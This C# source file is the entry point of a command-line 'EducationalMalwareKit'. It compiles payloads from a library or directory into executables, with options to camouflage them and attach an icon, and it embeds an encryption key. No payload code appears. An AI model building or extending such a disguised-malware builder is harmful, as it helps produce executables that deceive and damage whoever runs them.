using System;
using System.IO;
using System.Linq;
using CommandLine;
using EducationalMalwareKit.CodeAssembly.Compilers;
using EducationalMalwareKit.CodeAssembly.Helpers;
using EducationalMalwareKit.CodeAssembly.Models;
using EducationalMalwareKit.Options;
using EducationalMalwareKit.Toolkit;
using System.Threading.Tasks;
using EducationalMalwareKit.CLI;
using EducationalMalwareKit.Helpers;
using EducationalMalwareKit.Library;

namespace EducationalMalwareKit
{
    internal static class EMK
    {
        private enum OpCode
        {
            Success = 0,
            BadArgument = 1,
            CompilationError = 2,
            EmkConfigError = 3,
            UnknownError = 10
        }

        private static ExpertOptions _options;

        public static void Main(string[] args)
        {
            try
            {
                var parseResult
                    = Parser
                        .Default
                        .ParseArguments<EmkFileOptions, ExpertOptions, InteractiveOptions, LibraryOptions>(args)
                        .MapResult
                        (
                            (EmkFileOptions opts) => ConsoleCommands.FileMode(opts),
                            (ExpertOptions opts) => ConsoleCommands.ExpertMode(opts),
                            (InteractiveOptions opts) => ConsoleCommands.InteractiveMode(),
                            (LibraryOptions opts) => ConsoleCommands.PrintPayloadLibrary(),
                            errs => null
                        );

                if (parseResult == null)
                {
                    Environment.Exit((int)OpCode.BadArgument);
                }

                var buildResult = BuildMalwareAsync(parseResult).Result;

                if (buildResult == OpCode.Success && _options.CanBeBuildFile())
                {
                    FileHelper.CreateBuildFile(_options);
                }

                Environment.Exit((int)buildResult);

            }
            catch (Exception ex)
            {
                var message = ex.InnerException?.Message ?? ex.Message;
                Console.WriteLine("The following error occoured while attempting to assemble the malware\n" + message);
                Environment.Exit((int)OpCode.UnknownError);
            }
        }     

        private static async Task<OpCode> BuildMalwareAsync(ExpertOptions options)
        {
            _options = options;

            if (string.IsNullOrWhiteSpace(options.PayloadDirectoryPath) && options.LibraryEntryId > 0)
            {
                options.PayloadDirectoryPath = PayloadLibrarian.GetPayloadPath(options.LibraryEntryId);
            }

            if (!FileHelper.IsPathValidRootedLocal(options.OutputDirectoryPath))
            {
                throw new ArgumentException("Cannot create output directory, path invalid: " + options.OutputDirectoryPath);
            }

            if (!Directory.Exists(options.OutputDirectoryPath))
            {
                Directory.CreateDirectory(options.OutputDirectoryPath);
            }

            var malwareAssemblyOrder = new MalwareBuild()
            {
                PayloadDirectoryPath = options.PayloadDirectoryPath,
                PayloadConfig = ReadPayloadConfigFile(options),
                OutputDirectoryPath = options.OutputDirectoryPath,
                CamouflageAs = options.CamouflageAs,
                IconFilePath = GetIconFileIfExists(options.PayloadDirectoryPath)
            };

            var compiler = new CodeDomCompiler();
            var codeAssemblyHelper = new CodeAssemblyHelper(malwareAssemblyOrder);

            codeAssemblyHelper.SetCompilerInstructions(new CompilerInstructions()
            {
                ExecutablePath = Path.Combine(options.OutputDirectoryPath, options.OutputName),
                NetVersion = options.NetVersion,
                IsDebugMode = options.DebugMode,
                OutputDebugFiles = options.IncludeDebugData,
                EmbeddedEncryptionSalt = StringHelper.GetSudoRandomString(22),
                EmbeddedEncryptionKey = StringHelper.GetSudoRandomString(32)
            });

            var task = codeAssemblyHelper
                        .ExtractAndSetPayloadType()
                        .GenerateAndSetCode()
                        .WithCompiler(compiler)
                        .CompileAsync();

            ConsoleSpinner.UntilTaskComplete(task);
            var result = await task;

            Console.WriteLine(result);

            if (!result.IsSuccess)
            {
                Console.WriteLine("Error(s) during compilation. See below");
                result.Errors.ForEach(Console.WriteLine);

                return OpCode.CompilationError;
            }

            return OpCode.Success;
        }
       
        private static PayloadConfig ReadPayloadConfigFile(ExpertOptions options)
        {
            var filePath = options.ConfigFilePath;

            if (filePath == null)
            {
                return new PayloadConfig();
            }

            if (!File.Exists(filePath))
            {
                filePath = Path.Combine(options.PayloadDirectoryPath, options.ConfigFilePath);
            }

            return FileHelper.ReadJsonFile<PayloadConfig>(filePath);
        }

        private static string GetIconFileIfExists(string payloadDir)
        {
            return Directory.GetFiles(payloadDir, "*.ico").FirstOrDefault();
        }

    }
}

